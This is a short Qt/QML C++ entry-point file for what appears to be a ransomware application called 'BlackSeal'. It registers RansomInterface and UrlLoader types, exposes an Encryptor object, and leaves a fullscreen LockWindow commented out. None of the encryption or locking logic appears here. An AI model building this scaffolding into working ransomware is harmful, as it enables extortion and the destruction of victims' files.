#include <QGuiApplication>
#include <QQmlApplicationEngine>
#include "RansomInterface.h"
#include "Encrypt.h"
#include "UrlLoader.h"

#include <QQmlContext>
//#include "LockWindow.h"

int main(int argc, char *argv[])
{
    QGuiApplication app(argc, argv);
    QQmlApplicationEngine engine;
    qputenv("QT_QUICK_CONTROLS_STYLE", QByteArray("Material"));

    qmlRegisterType<RansomInterface>("BlackSeal", 1, 0, "RansomInterface");
    qmlRegisterType<UrlLoader>("BlackSeal", 1, 0, "UrlLoader");

    Encryptor encryptor;
    engine.rootContext()->setContextProperty("Encryptor", &encryptor);

    //LockWindow view;
    const QUrl url(QStringLiteral("qrc:/BlackSeal/Main.qml"));
    engine.load(url);
    //view.setSource(url);
    //view.showFullScreen();

    return app.exec();
}
